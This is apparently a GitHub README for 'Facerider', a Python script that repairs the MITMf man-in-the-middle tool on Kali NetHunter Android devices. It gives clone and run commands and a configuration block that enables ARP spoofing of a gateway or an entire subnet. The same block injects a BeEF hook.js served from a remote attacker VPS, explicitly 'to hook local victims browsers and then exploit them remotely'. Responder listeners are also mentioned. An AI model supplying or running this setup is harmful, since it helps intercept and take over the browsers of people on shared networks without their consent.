# Facerider: New and improved mitmf fixes for Nethunter Phones and Tablets

![](https://www.offensive-security.com/wp-content/uploads/2014/12/nethunter-onePlus-300x280.png)

Hello, so I just got my brand new/used OnePlus One and immediately added Kali NetHunter to it. Only to my dismay, that a number of features are broken.

**This repo specifically fixes the functionality of the MITMf overlay on your NetHunter App**. Rather than try to fix the overlay's mitmf command-line-parser (it leaves empty --whitelist and --blacklist options causing the attack to break on runtime), I decided to write a simple Python script with a centralized configuration option in ./Facerider/mitmf.cfg

**Using this is much simpler, just edit mitmf.cfg with your Android text editor of choice** (I use Total Commander's text editing function) and set your options to 0 (OFF) or 1 (ON), and set variables such as your Beef Framework hook.js URL to the = sign, and then run

<code>cd Facerider;python wip_mitmf_improved.py</code>

This can be configured to work as a Custom Command in the NetHunter App Menu

Within it, is a simple two-button ON/OFF attack switch. Select 1 and press [Enter] to start the attack. Select 2 and [Enter] to stop the attack and wipe all traces of any background processes that may be running (Responder listeners on certain ports)

![](https://raw.githubusercontent.com/tanc7/Facerider/master/fr-simpleonoff.png)
# Installation

Using your nethunter device, git clone this repo

<code>git clone https://github.com/tanc7/Facerider;cd Facerider</code>

Then edit the mitmf.cfg file, personally I do not use nano on Kali Nethunter because it's wonky with the phone's display options as you shift between portrait and landscape. You can install Total Commander from the Android App Store instead.

![](https://raw.githubusercontent.com/tanc7/Facerider/master/fr-config.png)

Leave empty = options commented out so the script won't throw a error.

# Beef Framework on a Remote VPS

The line "JS_URL = http://127.0.0.1:3000/hook.js" can be modified to point to a remote VPS (such as Amazon Web Services) running the beef framework allowing you to hook local victims browsers and then exploit them remotely.

Assuming you are using a wireless card and you have wireless connected your Nethunter device to a hotspot...

![](https://raw.githubusercontent.com/tanc7/Facerider/master/fr-beef-hook.png)

<code>
<br>set INTERFACE = wlan0
<br>set INJECT = 1
<br>set JS_URL = http://yourvpsipaddress:3000/hook.js
<br>set SPOOF = 1
<br>set SPOOF_TYPE = 1
<br>set SPOOF_GATEWAY = The gateway you found with the route -n command // Alternatively  you can use the IPTools app on the Google Play Store to find your local router's IP but it's been shoddy.
</code>

SPOOF_TARGET can be left commented out if you wish to attack the entire subnet.

# Known Issues

Running the --filepwn and --browsersniper options throws an error from the mitmf app. It is unable to connect to the msfrpcd service no matter how hard I try. This partly has to do with the changes that Rapid7 added to their msfrpc daemon and the fact that **mitmf has been a abandoned project since 2015. I am still WORKING on resolving this.**

